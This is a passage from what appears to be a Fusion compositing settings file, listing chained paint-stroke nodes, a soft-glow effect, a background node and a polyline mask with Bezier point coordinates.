				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke37 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378780182 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke36"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.234935015439987, 0.388735711574554 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke36 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378778922 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke35"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.240448996424675, 0.384797155857086 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke35 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378777003 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke34"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.210909813642502, 0.355257987976074 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke34 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378775203 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke33"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.256203234195709, 0.345411568880081 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke33 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378771497 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke32"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.422016531229019, 0.284757792949677 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke32 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378769757 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke31"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.404686897993088, 0.282000780105591 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke31 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378765077 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke30"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.275108307600021, 0.302481293678284 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke30 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378763862 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke29"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.310949206352234, 0.30051201581955 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke29 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378762167 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke28"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.335368245840073, 0.27451753616333 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke28 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378760382 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke27"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.336155980825424, 0.213863730430603 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke27 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378757577 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke26"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.131744787096977, 0.300905883312225 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke26 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378755342 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke25"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.185703039169312, 0.258369445800781 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke25 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378753197 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke24"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.0506104752421379, 0.219377711415291 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke24 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378747903 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke23"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.817053973674774, 0.224103972315788 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke23 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378744452 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke22"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.843442320823669, 0.185112252831459 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke22 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378742997 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke21"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.819023251533508, 0.165419459342957 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke21 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378741227 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke20"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.948995649814606, 0.146514371037483 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke20 = Stroke {
			Points = {
				{ X = -9.84669e-05, Y = 0.000295386, Time = 1378738497 },
				{ X = -9.84669e-05, Y = -9.84669e-05, Time = 1378738617, YSpeed = -0.0032821 },
				{ X = -9.84669e-05, Y = -9.84669e-05, Time = 1378738632 },
				{ X = 0.000295401, Y = -9.84669e-05, Time = 1378738647, XSpeed = 0.0262578 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke19"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.864415109157562, 0.113528952002525 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke19 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378737252 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke18"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.83871603012085, 0.123276881873608 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke18 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378735122 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke17"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.782394647598267, 0.135092556476593 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke17 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378733412 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke16"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.760732591152191, 0.146908238530159 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke16 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378731492 },
				{ X = 0, Y = 0, Time = 1378731537 },
				{ X = 0, Y = 0, Time = 1378731552 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke15"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.670933425426483, 0.166207164525986 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke15 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378729017 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke14"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.688263118267059, 0.119338318705559 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke14 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378726317 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke13"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.719771564006805, 0.0535643957555294 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke13 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378723542 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke12"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.624064564704895, 0.145726665854454 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke12 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378721472 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke11"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.57877117395401, 0.165025606751442 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke11 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378719507 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke10"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.527963757514954, 0.149271368980408 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke10 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378717572 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke9"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.529933035373688, 0.108310356736183 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke9 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378715262 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke8"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.343639224767685, 0.153209924697876 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke8 = Stroke {
			Points = {
				{ X = -0.000196874, Y = 0, Time = 1378713117 },
				{ X = 0.000196934, Y = 0, Time = 1378713162, XSpeed = 0.00875129 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke7"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.519101977348328, 0.00945254042744637 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke7 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378711377 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke6"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.368058294057846, 0.0484442710876465 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke6 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378701792 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke5"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.268609702587128, 0.179204404354095 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke5 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378697276 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke4"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.232958421111107, 0.079938642680645 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke4 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378695206 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke3"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.13548056781292, 0.145389467477798 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke3 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378692717 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke2"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.150477170944214, 0.000170444865943864 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke2 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378690677 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke1"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.0543626435101032, 0.0390318743884563 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke1 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378688247 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.0189161561429501, 0.034600306302309 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		SoftGlow1_2_2 = SoftGlow {
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				Threshold = Input { Value = 0.175, },
				Gain = Input { Value = 2.5, },
				XGlowSize = Input { Value = 5, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				ColorScale = Input { Value = 1, },
				RedScale = Input { Value = 1.3, },
				GreenScale = Input { Value = 1.024, },
				BlueScale = Input { Value = 0.71, },
				Input = Input {
					SourceOp = ""BG_2"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 445.5 } },
		},
		BG_2 = Background {
			NameSet = true,
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Polygon3_1"",
					Source = ""Mask"",
				},
				GlobalOut = Input { Value = 99, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				UseFrameFormatSettings = Input { Value = 1, },
				Depth = Input { Value = 2, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 0.953, },
				TopLeftGreen = Input { Value = 0.953, },
				TopLeftBlue = Input { Value = 0.953, }
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 379.5 } },
		},
		Polygon3_1 = PolylineMask {
			DrawMode = ""InsertAndModify"",
			DrawMode2 = ""InsertAndModify"",
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Ellipse1_3_1_2_1"",
					Source = ""Mask"",
				},
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Polyline = Input {
					Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = 0.250048179948642, Y = 0.0137103215981931, LX = 0.0190240857754257, LY = -0.00129945359701021, RX = -0.050008092300273, RY = 0.0023429325565818 },
							{ X = 0.155180653175224, Y = 0.0996080317439233, LX = 0.0259344854982108, LY = -0.0504068196106731, RX = -0.00634872786643511, RY = 0.0111164106598293 },
							{ X = 0.131606672939801, Y = 0.12846669195315, LX = 0.0089404851700467, LY = -0.00862273698188708, RX = -0.00961718353715526, RY = 0.0092753852358318 },
							{ X = 0.100547199713634, Y = 0.153804727335885, LX = 0.0111888934111642, LY = -0.00730285250392085, RX = -0.0142187716203402, RY = 0.00928041658048788 },
							{ X = 0.0546139744742205, Y = 0.175823701058436, LX = 0.0163674873709979, LY = -0.00451718446147705, RX = -0.0177145105445752, RY = 0.00488894293674032 },
							{ X = -2.82763968002808e-06, Y = 0.183330747661737, LX = 0.0181602739953269, LY = -3.8360453443629e-05, RX = 1.58712797849117e-06, RY = -0.0129622634274003 },
							{ Linear = true, X = 1.93374425544544e-06, Y = 0.144443957379536, LX = -1.58712797849117e-06, LY = 0.0129622634274003, RX = 0.013380893933308, RY = -0.000586165352053653 },
							{ X = 0.041390790948867, Y = 0.138729709965818, LX = -0.013394806375694, LY = 0.00381375556560871, RX = 0.0135994905525783, RY = -0.00387203303501662 },
							{ X = 0.0798639556315025, Y = 0.120861731699429, LX = -0.0119568763210141, LY = 0.0075479726919153, RX = 0.0095831644962077, RY = -0.00604952848699979 },
							{ X = 0.105888009658883, Y = 0.0989835886779672, LX = -0.00759426280881582, LY = 0.00841195631628187, RX = 0.00793794229525864, RY = -0.00879264064332453 },
							{ X = 0.126484529089925, Y = 0.0700236766681526, LX = -0.00556916718353494, LY = 0.0104549430532804, RX = 0.00462157266887695, RY = -0.00867603314415788 },
							{ X = 0.137742788726957, Y = 0.0427666783848621, LX = -0.00311101029975966, LY = 0.00932491822843642, RX = 0.0027234511117028, RY = -0.00816325131348322 },
							{ X = 0.142799041351788, Y = 0.0174499441744988, LX = -0.000603122126146119, LY = 0.00880855083180617, RX = -0.0189310201337992, RY = 0.000386057879807161 },
							{ Linear = true, X = 0.08600598095039, Y = 0.0186081178139203, LX = 0.0189310201337992, LY = -0.000386057879807161, RX = -0.0289470901385809, RY = 0.000584701700511587 },
							{ X = -0.000849683299860796, Y = 0.0193675384977854, LX = 0.028952920595889, LY = 6.55174622148272e-05, RX = -0.0275892107683575, RY = -6.24315280410579e-05 },
							{ X = -0.0836096315327127, Y = 0.0182242952408192, LX = 0.0275860133573293, LY = 0.00042463580371725, RX = -0.0193992675871726, RY = -0.000188603706852933 },
							{ Linear = true, X = -0.14180743429423, Y = 0.0176584841202604, LX = 0.0193992675871726, LY = 0.000188603706852933, RX = 0.000645737852992311, RY = 0.00697971862011963 },
							{ X = -0.138871310806356, Y = 0.0382563875219476, LX = -0.00146053577138264, LY = -0.00677983796842246, RX = 0.00149411723327595, RY = 0.00693572382540757 },
							{ X = -0.132127844031618, Y = 0.0584443991068688, LX = -0.00288993414926835, LY = -0.00647957806512052, RX = 0.00328134343147712, RY = 0.00735716449736728 },
							{ X = -0.120396045863232, Y = 0.0795730477255722, LX = -0.00472055362203963, LY = -0.00652774522006398, RX = 0.00537695989795764, RY = 0.00743544657738749 },
							{ X = -0.102990996640049, Y = 0.100900080652902, LX = -0.00630599916813317, LY = -0.0066657286204084, RX = 0.00561687028187838, RY = 0.00593728796924692 },
							{ X = -0.0846332264684511, Y = 0.117154244921351, LX = -0.00652422566381242, LY = -0.00492291577023863, RX = 0.00667485946281575, RY = 0.00503657791849289 },
							{ X = -0.0631417196985819, Y = 0.130092673363676, LX = -0.00757302471782108, LY = -0.00354544251126176, RX = 0.0105920844977962, RY = 0.00495886756753759 },
							{ X = -0.029987244023259, Y = 0.141574151349629, LX = -0.0114155054374675, LY = -0.00254339481166026, RX = 0.00980153730351765, RY = 0.00218379985543519 },
							{ X = 1.47182074294877e-06, Y = 0.144442767726094, LX = -0.0104239058835819, LY = -3.07609593942839e-05, RX = -1.64999467530913e-06, RY = 0.0129635394333832 },
							{ Linear = true, X = -3.47816328297862e-06, Y = 0.183333386026244, LX = 1.64999467530913e-06, LY = -0.0129635394333832, RX = -0.0129380984552594, RY = 2.32151932499929e-05 },
							{ X = -0.0378613493702643, Y = 0.180843207947981, LX = 0.0123221745310259, LY = 0.00284596268868089, RX = -0.0139569890342268, RY = -0.00322354385889638 },
							{ X = -0.0784325282649098, Y = 0.166677106003392, LX = 0.0128848989330334, LY = 0.00625844688379402, RX = -0.0106586711467163, RY = -0.00517712459913314 },
							{ X = -0.10914785587405, Y = 0.148781361888594, LX = 0.00940961305312447, LY = 0.00720201860031344, RX = -0.00952154602761799, RY = -0.00728769091858407 },
							{ X = -0.135697882485427, Y = 0.124511450762616, LX = 0.00791332487786552, LY = 0.00900830544876312, RX = -0.00759595700433842, RY = -0.00864702282881745 },
							{ X = -0.156879713890113, Y = 0.097243225336892, LX = 0.00559937215694352, LY = 0.00974386685948333, RX = -0.0202084334287145, RY = -0.0374412053077912 },
							{ X = -0.249852507374631, Y = 0.0138643067846608, LX = 0.0538436819813177, LY = 0.0056614189824542, RX = -0.0174897746590665, RY = -0.00118307456047589 },
							{ Linear = true, X = -0.30232183135183, Y = 0.0103150831032331, LX = 0.0174897746590665, LY = 0.00118307456047589, RX = -0.0108486230290836, RY = -0.000733841926044959 },
							{ X = -0.33472897148685, Y = 0.00659250621814011, LX = 0.0107578344246101, LY = 0.0015811843954009, RX = -0.00535452241850593, RY = -0.000787006655688769 },
